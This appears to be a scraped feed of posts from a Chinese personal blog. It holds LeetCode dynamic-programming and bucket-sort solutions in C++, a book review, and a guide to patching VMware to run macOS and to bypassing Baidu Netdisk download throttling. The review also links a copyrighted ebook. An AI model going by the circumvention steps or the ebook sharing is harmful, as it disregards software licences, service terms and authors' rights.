当前房屋的颜色和上一间房屋的颜色 j0 相同，街区数量不会变化，则 dp[idx][color][district] == dp[idx - 1][color][district] ； 当前房屋颜色和上一间房屋的颜色 j0 不同，街区数量应该加一，则 dp[idx][color][district] == dp[idx - 1][j0][district - 1] ；  当然，房子原本的颜色也会影响 dp 值的变化，具体实际上只有两方面：\n 房子原本没有颜色，即按照上面的规则 houses[idx] == -1 ，那么上面得到的 dp 值全都要加上 cost[idx][color] ； 房子原本有颜色，如果此颜色与 color 不同，那么这种上色方案无论如何是不可行的；如果此颜色与 color 相同，那么 dp 值就是我们上面分析的情况。  把这些分析加以实现，我们应该：\n- 枚举房子下标 --\u0026gt; idx: 0 ~ m - 1\r- 枚举上色方案 --\u0026gt; color: 0 ~ n - 1\r- 如果房子有颜色且不同于 color，继续枚举颜色\r- 运行至此有两种情况：房子没有颜色，或房子有颜色且颜色就是 color\r- 如果房子下标 idx 是 0， 意味着没有上一个房子，dp[idx][color][0] = houses[idx] == -1 ? cost[0][color] : 0;继续枚举颜色\r- 否则开始枚举街区 --\u0026gt; district: 0 ~ target - 1\r- 枚举上一间房子的颜色 --\u0026gt; j0: 0 ~ n - 1\r- 如果上一间房子的颜色和现在的颜色相同，设置 dp 值 // [1]\r- 如果上一间房子的颜色和现在的颜色不同，设置 dp 值 // [2]\r- 如果房子原本没有颜色，得到的 dp[idx][color][district] 要加上 cost[idx][color]\r根据上面的实现来写代码，应该要注意几个要点：\n 在伪代码 [1] 和 [2] 处，由于我们在进行上一间房子颜色的枚举，不能简单地设置 dp[idx][color][district] == dp[idx - 1][j0][district] ，而是应该根据 dp 的定义，取其中的最小值，即AC代码中所做的取 min 。 由于我们枚举的街区 district 从 0 开始，对于当前房屋和上一间房屋颜色不同的情况，需要判断街区数大于 0 才有意义。 注意 cost[idx] 添加的位置，枚举完上一间房子的颜色之后就进行添加，因为对于所有的 district 都要考虑这一情况。 我们如何表示 dp 的初始值：由于随时可能在一个未被修改的 dp 上加上我们的 cost ，那么它的初始值就不能设置得太大，在具体实现中，我们重新定义了一下 INT_MAX 。  AC代码 class Solution { public: #undef INT_MAX #define INT_MAX 0x3f3f3f3f // #define DEBUG  int minCost(vector\u0026lt;int\u0026gt;\u0026amp; houses, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; cost, int m, int n, int target) { int idx, color, district; vector\u0026lt;vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026gt; dp(m, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;(n, vector\u0026lt;int\u0026gt;(target, INT_MAX))); for (int\u0026amp; hc : houses) { hc--; } for (idx = 0; idx \u0026lt; m; idx++) { for (color = 0; color \u0026lt; n; color++) { // this color can not be applied  if (houses[idx] != -1 \u0026amp;\u0026amp; houses[idx] != color) continue; if (idx == 0) { dp[idx][color][0] = houses[idx] == -1 ? cost[0][color] : 0; continue; } // enum districts  for (district = 0; district \u0026lt; target; district++) { // enum the color of house[idx - 1] !!  for (int j0 = 0; j0 \u0026lt; n; j0++) { // same color  if (j0 == color) { // the district will not change  dp[idx][color][district] = min(dp[idx][color][district], dp[idx - 1][j0][district]); } else { if (district) dp[idx][color][district] = min(dp[idx][color][district], dp[idx - 1][j0][district - 1]); } } if (houses[idx] == -1) { dp[idx][color][district] += cost[idx][color]; } } } } # ifdef DEBUG  for (idx = 0; idx \u0026lt; m; idx++) { cout \u0026lt;\u0026lt; \u0026#34;House \u0026#34; \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; endl; for (color = 0; color \u0026lt; n; color++) { cout \u0026lt;\u0026lt; \u0026#39;\\t\u0026#39; \u0026lt;\u0026lt; \u0026#34;Color \u0026#34; \u0026lt;\u0026lt; color \u0026lt;\u0026lt; endl; for (district = 0; district \u0026lt; target; district++) { cout \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; dp[idx][color][district] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } #endif  int ans = INT_MAX; for (color = 0; color \u0026lt; n; color++) { ans = min(ans, dp[m - 1][color][target - 1]); } if (ans == INT_MAX) return -1; else return ans; } }; \rPerformance\r\n参考文章 [1] 力扣官方题解.粉刷房子 III[EB/OL].2021-05-02\nhttps://leetcode-cn.com/problems/paint-house-iii/solution/fen-shua-fang-zi-iii-by-leetcode-solutio-powb/\n[2] 宫水三叶.【宫水三叶】三维动态规划，以及其「状态定义」由来[EB/OL].2020-05-04\nhttps://leetcode-cn.com/problems/paint-house-iii/solution/gong-shui-san-xie-san-wei-dong-tai-gui-h-ud7m/\n","date":"2021-05-04T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1473.-%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90-iii/","title":"难题本 | LeetCode1473. 粉刷房子 III"},{"content":"如果你单纯地想体验一下以“简洁高效“闻名的Mac OS，那么我会强烈推荐你为自己创建一台Mac OS的虚拟机，使用这种方法，你不需要花费大几千元去购入一台Mac Book，就能得到最完整的系统体验。当然，假若你在体验之后爱上了这款系统，之后努力工作为自己的情怀买个单也是有所必要的。\n解锁VMWare 我们诸多步骤中最困难的一步就是解锁VMWare了。为什么叫解锁呢？因为我们使用的程序被作者命名为 unlocker ，就这么简单······ 我假定阅读本文的读者已经知道什么是VMWare，并且创建过自己的虚拟机，对于VMWare的安装等流程不再赘述。本文使用的是VMWare Workstation Pro 16 。\n正常的VMWare在创建虚拟机的时候，需要选择虚拟机操作系统，而且只有简单的几个选项（Windows/Linux/···）。我们在选项列表中看不到 apple MacOS 这类的字眼，因此我们要做的第一件事就是让VMWare能够创建 Mac OS 类型的虚拟机。 这一步真是非常的简单啊。总体而言，我们只需要进行三个步骤：\n 下载 unlocker 软件 软件运行之前做一些前期的准备 运行！  Amazing，看起来一点都不难吧？\nStep1 我们去 这个网址 下载所需要的软件。\n对应于本文所使用的VMWare 16，你可以有两种选择：\n Auto-Unlocker v1.1.3 以一个 exe 的形式封装好了所有的流程，在我的测试中，这个软件总是不能成功解锁VMWare，令人生气。 根据某个 issue 中的办法，去 这里 下载另一个版本的 unlocker ，兄弟，这个办法真的管用！  使用第二个办法，下载的文件解压之后大概是这样的： \runlocker files\r 相信你能自己找到 win-install.cmd 这个文件，对吧？\nStep2 现在先不要急着运行，我们需要做一些运行之前的准备。\n打开任务管理器，首先杀掉跟VMWare有关的进程，它们一般都以 VM- 这样的格式开头。\n然后进入到任务管理器的【服务】面板，停止跟VMWare有关的服务，如 VMNetDHCP 等，它们的格式也都以 VM- 开头。\n不用担心服务没有关干净，或者进程杀不掉的问题。理论上我们的 unlocker 能够自动关掉这些服务，等到解锁完毕之后再启动它们。我在这里啰嗦这些，主要是忠实地记录我的实践结果，如果你运气好的话，跳过这一步最终也是可能成功的。\nStep3 万事俱备，我们右键那个 win-install.cmd ，以管理员身份运行，等它运行完毕了，你的VMWare应该就支持 Mac OS 了！ \rNew option\r\n  Q：VMWare 16，按照上面的流程走，没有效果怎么办？ A：首先可以尝试使用 VMWare installer 进行一个 repair 的操作，也就是修复VMWare的安装了。如果这一步还不行的话，可以试试其他版本的 unlocker 。   下载Mac OS镜像 这一步可就厉害了！我不会向你分享镜像的链接（网上多的很），但是我要告诉你怎么突破百度网盘的限速！ 总的来说，还是分成3个步骤：\n 下载IDM 下载并安装Temper Monkey 下载直链助手插件，获取直链进行下载  下载IDM IDM（Internet Download Manager）是一个多线程下载器，具体的原理大概就是面对一个大文件时，每一个线程从不同的起点开始下载，最终把每个线程下载的多个模块还原成原本的文件。当然，我们不需要深入探查它的实现方式，只需要去 这个地方 下载软件就好了！ 安装软件的过程就不多说了，据说Edge浏览器也可以集成IDM插件，但是在我的实践中好像并没有用到它。\n下载并安装Temper Monkey 鼎鼎有名的Temper Monkey（油猴）是一个浏览器插件管理器，使用这个东西你可以方便地下载并使用大佬们创造并分享出来的JavaScript程序。在Edge的扩展商店中找到Temper Monkey，下载并安装就行了。\n安装直链助手 直链 是指百度网盘中的资源实际存储的链接，我们通过这个链接直接访问这个资源，就不用经过坑爹的限速服务器了！ 激活Temper Monkey之后，可以直接点击它搜索我们需要的脚本。 \rFind new scripts\r 当然，我已经亲测了若干款直链助手，可用的一款可以从 这里 下载。 使用这个助手，你需要将目标资源先转存到自己的网盘中，然后进行直链提取，否则提取到的链接可能被阻止访问。 在自己的网盘中，选中你所需要的文件（在这里当然是Mac OS的镜像了！），工具栏中应该出现【简易下载助手】这一按钮，单击进去，后面获取直链的操作就是傻瓜步骤了。\n\rDownload Manager\r 获取直链地址之后，根据它的提示先设置好IDM的一些参数，然后新建一个下载任务，把直链填进去，开始愉快地下载你的镜像吧！\n\rDownload speed\r\n安装虚拟机 直接假定你已经会安装虚拟机了，这一步就说得简单一点吧。 在创建虚拟机时给什么样的配置合适呢？我的配置是：\n 2核CPU 6G内存 50G硬盘  除了开机有点慢之外（可能因为我的虚拟机放在宿主机的机械硬盘上），运行起来还是比较流畅的。 第一次打开时，不要直接选择【安装macOS】，而要在设置完语言后先选择【磁盘工具】，选择VMWare Virtual SATA，并【抹掉】盘符内容及设置名称。 下面两幅图来自参考资料[1]。\n\rProcess disk first\r\n\rErase disk\r\n完成之后按【Esc】返回上一个页面，选择【安装macOS】，一路往下走即可。\n进入桌面后，你可以看到我们安装系统时使用的光盘，右键选择推出光盘，然后在VMWare的MacOS标签上右键选择【安装VMWare Tools】，一直继续安装。\n此时，会弹出一个VMWare的系统软件被阻止载入的提醒，我们进入【系统偏好设置】（也就是Apple通用的那个小齿轮标志），选择【安全与隐私】，先点击左下角解锁，然后允许VMWare在我们的电脑上安装程序。\n最后，安装完毕之后重启虚拟机，就可以开始愉快的Mac OS之旅了！\n在这一步的过程中截的图比较少，你可以阅读参考文章[1]来获取更多的信息。\n这一步下来，有几点需要注意：\n VMWare Tools可能无法一次成功，确保你在【安全与隐私】中允许VMWare安装程序；如果它不生效，就重新安装几次。 虚拟机无法连接Wi-Fi，但是由于我们是虚拟机，可以直接连接宿主机的网络， 无需再折腾网卡驱动了 ！这也是虚拟机体验Mac OS比真实物理机更加方便的一点。为了使我们的虚拟机能够通过NAT上网，记得在任务管理器中把第一步解锁VMWare时关闭的 VMNetDHCP 等服务重新开起来。 保护知识产权，体验体验也就好了，真心喜欢Mac的话记得为信仰充值！ 本文编写于Mac OS 。  \rMacOS animation\r\n\rMarkdown edit\r\n参考资料 [1] 小生观察室.新版VMWare之MacOS系统爬坑记[EB/OL].2020-10-20 https://mp.weixin.qq.com/s/rqw9m8JVJ_XHi4Ufst_rsQ\n[2] https://github.com/paolo-projects/auto-unlocker/issues/40\n","date":"2021-04-30T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%B0%9D%E5%B0%9D%E9%B2%9C%E4%B8%BA%E8%87%AA%E5%B7%B1%E8%A3%85%E4%B8%80%E5%8F%B0mac-os%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"尝尝鲜——为自己装一台Mac OS虚拟机"},{"content":"《偷影子的人》是一部好作品。\n人的一生会面对很多种情感，很大一部分是不可言传的。然而，法国人马克·吕维用他的简明而精巧的设计、温馨而幽默的笔触将一些宏大的、复杂的情感呈现在读者面前了。\n《偷影子的人》确实是一部好作品。\n 小男孩有一个特殊的能力——与影子对话。当他的影子与别人的影子贴到一起，他可以从别人的影子那里听到影子主人的秘密；当别人的影子挤占了自己影子的位置时，别人的影子就被小男孩“偷”走了。\n人，总是有很多的秘密，潜藏内心的渴望、不愿想起的哀伤······得益于“偷”影子的能力，小男孩能够从最清晰的角度与人交往，一切都是纯粹的，除了自己的内心。\n友情 小男孩的第一个朋友是学校的警卫伊凡。\n这是他的倾听者，在这位忘年之交面前，他可以说出很多东西：对欺凌自己的马格的不满、对女生伊丽莎白的暗恋，大概除了自己“偷影子”的能力，其他的都是可以说的。伊凡在小男孩的童年里或多或少地扮演了一些父亲的角色，他具有生活的经验，是一个稳重的人。小男孩对伊凡的感情是珍惜，但并非对父亲那样的依赖。\n学校的煤气炉爆炸了，伊凡的影子活了起来，小男孩循着他的影子救了伊凡一条命。\n伊凡最珍惜的纪念册被烧了，小男孩从他的影子中得知了伊凡妈妈的事情。\n一位挚爱着自己腹中孩子的母亲，会对自己的孩子说些什么呢？小男孩让他的妈妈写下了这样一封特殊的信，他想弥补伊凡的缺憾。\n伊凡走了，为着自己未曾见面的母亲，他希望去践行全天下母亲的心愿：自己的孩子能过上幸福的生活。伊凡，辛苦了一生，遗憾了一生，日复一日的警卫工作磨灭了生命的热情，他本来将要迎来并送走一届又一届的小男孩，但是在最终，他的影子和一个“偷影子的人”给他带来了此生的意义。\n小男孩的第二个朋友是面包师家的吕克。\n这是他的同龄人，是他一生的好友，是他迷茫时候的明灯。\n吕克的梦想是什么呢？继承家业，做一个出色的面包师傅吗？不，受限于家庭的经济条件，吕克是无法去追求他的医学生梦想的，只能在小镇上，继承家业，做一个出色的面包师傅。\n吕克的影子和一个“偷影子的人”给他带来了逐梦的机会。吕克的父亲不爱自己的孩子吗？自己的家庭条件，让孩子去攻读医学是多么的奢侈！如果没有那个偷影子的人，这位面包师傅本来已经做好了让孩子、也让自己在遗憾中度过余生的打算；在那晚，偷影子的人来找自己，无需多言，希望自己给吕克一个实现梦想的机会。实现孩子的梦想，对自己的家庭来说是何其困难啊！一个强壮的面包师傅，在作坊前的长椅上哭得无比伤心。\n吕克终究是得到了逐梦的机会。梦想和现实的对比是多么强烈，复杂无趣的功课是每个人都能承受的吗？或者外科急诊的血肉模糊的伤员，解剖台那令人发怵的躯体，昼夜颠倒的工时？吕克很幸运，他的父亲不再逼迫他成为一名面包师，让他出来追求自己的梦想；而他认清了自我，知道了自己最终的梦想是当一位不用见血、不用旁观别人的死别就能为人们带来温饱和幸福的面包师傅。\n渡人亦是渡己，小男孩从这两份真挚的友情中收获了内心的清明。如果没有伊凡，童年时郁结于心的忧愁如何开解呢？如果没有吕克，就没有成年之后的对童年旧情的勇敢追求。\n爱情 一个孩子，是懂得爱情的吗？\n小男孩起初是不懂的，对伊丽莎白的朦朦胧胧的好感，只能归结于对美的天然追求。但是很快他就意识到，唯其萦绕于心，经久不忘，别来怅然，方可称为爱情。\n小男孩是懂得爱情的。\n克蕾儿是一个多么值得爱的女孩啊！她和偷影子的人是多么合适的伴侣啊！\n “我不知道对我来说哪一样比较痛苦，是从背后传来的讪笑，或是朝我射来的轻视眼光。谁会愿意爱上一个无法言语的女孩，一个笑时会发出嘶哑叫声的女孩？谁能在我害怕时给我安全感？我真的很害怕，我什么都听不到，包括脑海中的声音。我害怕长大，我很孤单，我的白昼如同无止境的黑夜，而我如同行尸走肉一般穿越其中。”\n世上没有任何一个女孩敢对一个刚认识的男孩说出同样的话。这些话并非由克蕾儿的口中发出，而是她的影子在沙滩上低低地向我诉说，我终于明白了为何之前影子会向我求救。\n“克蕾儿，你要知道，对我来说，你是全世界最美丽的女孩，是那种可以用嘶哑叫声擦去天空的阴暗、有着大提琴音色般的女孩。你要知道，全世界没有一个女孩可以像你一样让风筝快速旋转。\n“这些话，我只敢悄悄在你背后喃喃地说，不敢让你听到。一面对你，我就成了哑巴。”\n 自第一次分别之后，十余年间两人不曾再见。小男孩吻了伊丽莎白，隔天便分手了；读医学生时认识了苏菲，从友情升格为爱情之后，爱情的光终究黯淡褪色。小男孩没有得到幸福，直到他再次回到与克蕾儿相见的海滩，回到两人秘密的灯塔里。\n 我等了你四个夏天，你没有信守承诺，你再也没有回来。风筝死了，我将它埋葬在这里，谁知道呢，也许有一天你会找到它。\n署名：克蕾儿\n  我的夏日知己变得如何了呢？那个因为听不到声音，而让我可以毫不畏惧地向她倾诉所有秘密的小女孩啊！\n我闭上眼睛，我们曾经跑得上气不接下气，被带路的老鹰风筝拖着跑，你放风筝的功力无人能及，常常会有路上的行人停下脚步，只为欣赏你灵活的技巧。曾经有多少次，我牵着你的手走到这相同之地？你现在怎样了？你如今身在何方？你又会在哪个沙滩度过每个夏天？\n 何其的凄美啊！遗憾总是贯穿所有人的人生，童年最炽热的感情被时间尘封，最终掩盖记忆的尘埃却被一些偶然的事情所拂去，于是这从未熄灭的感情就无比猛烈地迸发出来了。\n结局是很美好的，小男孩找到了克蕾儿的住所，用一种浪漫的方式表达出自己迟到的歉意：\n 此日清晨，我回到原地，早晨和煦的风微微吹拂，我带来了我的风筝。才刚展开，“老鹰”的双翼就鼓了起来，然后快速飞起。几个行人饶有兴味地停下脚步观看，然后才继续赶路。修补过的老鹰风筝沿着建筑物正面攀爬而上，还在四楼的窗户前旋转了几圈。\n当克蕾儿注意到风筝时，她正在厨房泡茶，她简直不敢相信自己的眼睛，吓得把手上的早餐杯摔碎在地砖上。\n几分钟过后，大楼的门打开，克蕾儿朝我冲了过来。她目不转睛地盯着我，对着我微笑，把手放进我的手里，不是为了握我的手，而是要抓住风筝的手柄。\n在城市的天空里，她用纸老鹰画出大大的S和无数个完美的8。克蕾儿向来擅长在空中写诗，当我终于看懂她写的句子时，我读出：”我想你。”\n一个会用风筝向你写出“我想你”的女孩啊，真让人永远都忘不了她。\n 这部作品以爱情这条线作为全书的结尾，我在两年之前初读此书，颇觉意犹未尽。再读之下，我认为这条主线是有缺憾的。为什么自第一次分别之后，四年间再没有机会回去呢？小男孩的妈妈是工作繁重的护士，但是对于小男孩是关爱的，四年暑期全然地没有机会回到海滩边是不合理的。长大后第一次见到克蕾儿，演出之后她身边的男伴是谁呢？两人最终相认之后，三者的感情要如何延续呢？克蕾儿和男伴一同离去时，她的笑声已经没有了大提琴的音色，这意味着什么？我认为，这些细节我是没有读透的，作者给我们留下的空间太多了，总是有一些很美好和一些很不美好的想象在我们心头萦绕，这样的体会见仁见智，于我而言是不好的。\n亲情 将亲情放在最后，是因为这段感情给我最大的触动。\n小男孩的爸爸在他上小学的时候离开了家庭，小男孩的妈妈成了单亲妈妈。这位妈妈真是一个无比温柔的人，总是给自己的孩子最温馨的一面，而将疲累深埋起来。在妈妈的影响下，小男孩也成长为一个温柔的人，他使用自己“偷影子”的能力帮助很多人摆脱了枷锁，这和这位伟大母亲的作用是分不开的。同时，长期与妈妈相依为命，小男孩的情感中具备很多女性的敏感和犹疑，他无法把握自己友情和爱情的界限，因此伤害了无辜的苏菲。\n在小男孩离家求学的时候，这位母亲的信是报喜不报忧的，永远不让自己的孩子操心，直到最终的离去。\n小男孩对妈妈的爱从未变化过，在时光流逝中产生的思考是非常真实的：\n 青少年时期，我们总梦想着离开父母的一天，而改天，却换成父母离开我们了。于是我们就只能梦想着，能否有一时片刻，重新变回寄居在父母屋檐下的孩子，能抱抱他们，不害羞地告诉他们，我们爱他们，为了能让自己安心而紧紧依偎在他们身边。\n 在妈妈的葬礼之后，迎来了我最为难过的一段：\n 我走到厨房，打开冰箱，看到她准备好的晚餐······\n我呆若木鸡地站在敞开的冰箱前，眼泪失控地奔流而下。葬礼全程我都没有哭泣，仿佛她禁止我哭，因为她希望我不要在众人面前失态。只有碰到毫不起眼的小细节时，我们才会突然意识到，深爱的人已经不在的事实：床头桌上的闹钟仍在滴答作响，一个枕头落在凌乱的床边，一张照片立在五斗柜上，一支牙刷插在漱口杯中，一只茶壶立在厨房的窗台上，壶嘴面向窗户以便观看花园，而摆在桌上的，还有吃剩的淋了枫糖浆的苹果卡卡蛋糕。\n 读完上面的句子，我的内心如受猛击，在真实世界中漂泊数年的思绪尽皆涌上心头。我们还有多少的时间来陪伴我们最爱的人们呢？亲情，无比浓烈而终将消散，命运已经注定了养你长大的人将离你而去。如若我亲临上面句子中的情境，内心将会是何等的悲痛。\n“悲剧就是把美好的东西打碎给人看”，再读《偷影子的人》，已不觉得它是美好的、治愈的，而是深沉的、忧伤的。友情和爱情的起伏不过是亲情主线的点缀，亲情的缺憾、补完、温馨和厚重而终至于飘散，给全文染上了最强烈的色彩。一位温柔了一辈子、爱了自己孩子一辈子的母亲，最终的愿望还是让自己的孩子追求自己想要的生活，活得健康而快乐，如此才于文末引出了对童年爱情的回溯、与克蕾儿的重逢。\n在这条主线上，我现在所能表达的，大抵只有如此。这条贯穿了全文的脉络，用言语描述起来是无力的，是需要亲自去品味的。\n小结 两年半前读此书，初入大学的校门。在沙河强劲的秋风中有感于爱情线的美好，颇觉本书实在温暖人心。两年间世殊时异，情随事迁，无意中再作翻阅，感慨已然不同。《偷影子的人》真是一部很好的作品，很感谢它在我浮躁、功利的生活中带给我一天多的专心阅读的时光，我的影子被偷走了，融入了书中的世界，它又回来了，留给我萦绕不散的万千思绪。\n总结性的笔记只是我阅读此书时诸多思考中的一点，书中所刻画的如马格、苏菲等人物仅仅简单地提及，但对于整个故事的作用是不可忽视的。我将这本书的电子版本留在此处，希望有缘读到它的人能了解到这个故事的全部、从这部优秀的作品中产生一些思考。如此举侵犯版权，请及时联系我删除。\n 《偷影子的人》（mobi格式）\n ","date":"2021-04-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%81%B7%E5%BD%B1%E5%AD%90%E7%9A%84%E4%BA%BA/","title":"再读《偷影子的人》"},{"content":"题目链接：https://leetcode-cn.com/problems/contains-duplicate-iii/\n这是个中等题？\n题目  给你一个整数数组 nums 和两个整数 k 和 t 。请你判断是否存在 两个不同下标 i 和 j，使得 abs(nums[i] - nums[j]) \u0026lt;= t ，同时又满足 abs(i - j) \u0026lt;= k 。\n如果存在则返回 true，不存在返回 false。\n示例1\n 输入： nums = [1,2,3,1], k = 3, t = 0 输出： true  示例2\n 输入： nums = [1,5,9,1,5,9], k = 2, t = 3 输出： false  数据范围\n 0 \u0026lt;= nums.length \u0026lt;= 2 * 104 -231 \u0026lt;= nums[i] \u0026lt;= 231 - 1 0 \u0026lt;= k \u0026lt;= 104 0 \u0026lt;= t \u0026lt;= 231 - 1   分析 朴素想法：遍历每个满足条件的 i 、 j ，找到符合条件的就退出。\n时间复杂度 O(kn) ，直接超时。\n想不到更优的办法了，查看题解之后在此进行记录。\nMethod 1、滑动窗口 + 有序集合 首先将问题进行简化。\n 希望使得 asb(i - j) \u0026lt;= k ，那么我们每遍历到一个下标 i ，就直接 向前（向左） 查看 k 个元素，直到触及 左边界 。这样做的正确性在于，我们能够考虑到一个下标的左边 k 个元素，而它的右边 k 个元素在接下来的 k 轮循环中得以考虑。 希望使得 abs(nums[i] - nums[j]) \u0026lt;= t ，化简绝对值不等式，等价于 -t \u0026lt;= nums[i] - nums[j] \u0026lt;= t ，等价于 nums[i] - t \u0026lt;= nums[j] \u0026lt;= nums[i] + t 。这个不等式表明了，对于一个 nums[i] 和它左边的 k 个元素 ，我们只需要考虑这 k 个元素中是否有一个落在 nums[i] - t ~ nums[i] + t 这个区间内。  对于第一点，希望保存这左边的 k 个元素，我们自然有许多种办法，但是普通的 队列、向量 等数据结构会使得第二点的条件难以实现 —— 我们如何在这 k 个元素中查找落在 nums[i] - t ~ nums[i] + t 区间内的元素呢？\n显然，我们需要的是一种快速 查找 的数据结构，而且对于遍历到的一个 nums[i] 来说，我们还需要将其插入这个结构中，因此这个数据结构还需要实现快速的 插入 ，我们希望满足第二点要求，显然就需要这个数据结构是 有序的 ，这样查找一个特定范围内的数据才会显得方便。\n好了，这样的数据结构就是 红黑树 。\n很不幸地，我至今不会手写红黑树的实现；很幸运地，我们使用STL提供的类型就行了。\n我此前写过的某篇文章也提及了，C++中 set / map / multiset / multimap 底层都是红黑树；具体到本题，使用 set 即可，因为在一段区间内出现两个相同元素的话，一定是满足条件的。\n我们希望查找某个区间的元素，可以进一步转化为 一次查找 + 一次判断：对于一个 nums[i] ，我们找到 k 个元素中 第一个大于 nums[i] - t 的元素，判断其是否 小于 nums[i] + t ，若满足，返回 true ，若不满足，则这些元素中也没有其他的满足者。\n记住，是 第一个大于 nums[i] - t 的元素！\n非常不错地，set.lower_bound() 干的就是这份工作。\nAC代码1 class Solution { public: bool containsNearbyAlmostDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k, int t) { set\u0026lt;long\u0026gt; s; // set.lower_bound(val)  // 返回集合中第一个 大于 val的元素  for (int i = 0; i \u0026lt; nums.size(); i++) { auto lb = s.lower_bound((long)nums[i] - t); // cout \u0026lt;\u0026lt; *lb \u0026lt;\u0026lt; endl;cout \u0026lt;\u0026lt; \u0026#34;I: \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl;  if (lb != s.end() \u0026amp;\u0026amp; *lb \u0026lt;= (long)nums[i] + t) { /* cout \u0026lt;\u0026lt; \u0026#34;I: \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; t \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; *lb \u0026lt;\u0026lt; \u0026#34; \u0026lt;= \u0026#34; \u0026lt;\u0026lt; (long)nums[i] - t \u0026lt;\u0026lt; endl; */ return true; } s.insert((long)nums[i]); if (i - k \u0026gt;= 0) { s.erase(nums[i - k]); } } return false; } }; 在上面的代码中，有几点需要注意：\n 数据类型！ 这个题真是坑的不能再坑了，既然数据范围那么大的话，给出的输入数组就不要用 int 嘛（手动擦汗）。我们的集合类型是 long ，每次加减法之前也都要将数据转为 long 。 删除范围外的数据。我们每一轮循环的时候是 先判断，再插入，再删除 ，因此注意边界条件是 i - k \u0026gt;= 0 。  \rPerformance1\r\nMethod 2、桶排序 基本上所有的题解都说是桶排序，那我也就跟着说是桶排序吧，它的实际做法与我对桶排的认知还是有一定的区别的。\n我们知道，在计算机中两个整型相除，结果还是整型，默认 向下取整 ，如 1 / 4 = 0 ， 3 / 4 = 0 ， 4 / 4 = 1 。\n按照这样的逻辑，对于任意的两个 整数 n1 、 n2 ，若它们除以一个数 t 的结果相等，则 abs(n1 - n2) \u0026lt;= t - 1 。\n我们使用反证法来进行证明：\n 已知 n1 ÷ t == n2 ÷ t ，不妨令 n1 \u0026gt; n2 ，\n设 abs(n1 - n2) \u0026gt; t - 1 ，则 n1 \u0026gt; n2 + t - 1 ，即 n1 \u0026gt;= n2 + t （它们都是整数）；\n则 n1 ÷ t \u0026gt;= n2 ÷ t + 1 ，\n与已知条件违背，故当 n1 ÷ t == n2 ÷ t 时， abs(n1 - n2) \u0026lt;= t - 1 。\n 将这个定理结合题目进行分析，我们希望使得 abs(nums[i] - nums[j]) \u0026lt;= t ，若是 nums[i] / (t + 1) == nums[j] / (t + 1) ，则它们一定满足条件。\n 进行了理论上的证明，我们可以再来看看直观的模拟，设 t = 3 ，我们希望找到距离 不大于3 的一对数，根据上面的分析，我们应该计算 nums[i] / (3 + 1) 的值。\n\r一些正数除以4的值\r\n我们将下面的绿色框框称为 桶 ，上面的数字根据自己除以 4 的值来决定自己应该在哪一个桶里。非常容易发现，同一个桶中的数字满足 差的绝对值不大于3 这一要求。\n除了同一个桶中的数字，显然相邻桶中的数字也可能满足要求。例如对于 1 号桶中的数字 5 来说，隔壁 0 号桶中的 3 或者隔壁 2 号桶中的 8 也是满足要求的。\n我们对给出的整型数组进行遍历，得到一个数之后就去计算它所属的 桶编号 ，然后将这一对 桶编号 —— 数值 的映射保存起来。对于任意一个数，如果它的桶编号已经存在于我们的记录中，那么显然我们已经找到了 同一个桶中的两个数字 ，就可以 return true; 了；如果它的桶编号不存在于我们的记录中，我们还要看看它两边的桶是否存在，存在的话就取出其中的数值来比较一下大小，判断是否满足题意。\n至此，仅剩最后一个细节了：负数。\n你会发现，引入了负数之后，如果还是计算 n / (t + 1) 的话，会出现一些尴尬的情况，还是以 t = 3 为例：\n\r引入负数的桶编号计算结果\r\n有几点问题：\n -3 和 3 的计算结果竟然都是 0 ，它们属于同一个桶，但是显然不符合 abs(3 - (-3)) \u0026lt;= 3 这一要求 -4 和 -1 ~ -3 的计算结果竟然是不一样的，但是 -1 ~ -4 显然应该属于同一个桶  我们一一来进行解决。\n首先，负数和正数都可能计算出编号为 0 的桶，我们直接令 负数 的计算结果 减一 ，这样做对于我们的桶编号没有影响，但是可以把负数的计算结果和正数的计算结果分开。\n\r负数的计算结果减一\r\n其次，我们已经将 0 ~ 3 归于正整数的计算中了（0号桶），则不必再将 0 放入到负数的队伍中；这样来说，全体负数应该先 加上1 再进行计算，补上 0 的位置。\n这样， -1 ~ -4 就都属于同一个桶中了。\n\r负数先加一再进行后续计算\r\n 综合以上分析，我们在具体实现中使用一个 map\u0026lt;int, int\u0026gt; 来保存 桶编号 —— 数值 这一映射，遍历数组，计算对应数值的桶编号，查看 map 中是否已经有了相同编号或相邻编号的桶；根据题意，我们一次只能保存 k 个桶，那么只需要重新计算边界数值对应的桶编号，将其删除之后再继续进行循环。\nAC代码2 class Solution { public: int getID(int n, int t) { if (n \u0026gt;= 0) { return (long)n / ((long)t + 1); } else { return ((long)n + 1) / ((long)t + 1) - 1; } } bool containsNearbyAlmostDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k, int t) { map\u0026lt;int, int\u0026gt; bucket; for (int idx = 0; idx \u0026lt; nums.size(); idx++) { int id = getID(nums[idx], t); // cout \u0026lt;\u0026lt; id \u0026lt;\u0026lt; endl;  auto ite = bucket.find(id); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } ite = bucket.find(id - 1); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } ite = bucket.find(id + 1); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } bucket[id] = nums[idx]; if (idx - k \u0026gt;= 0) { ite = bucket.find(getID(nums[idx - k], t)); bucket.erase(ite); } } return 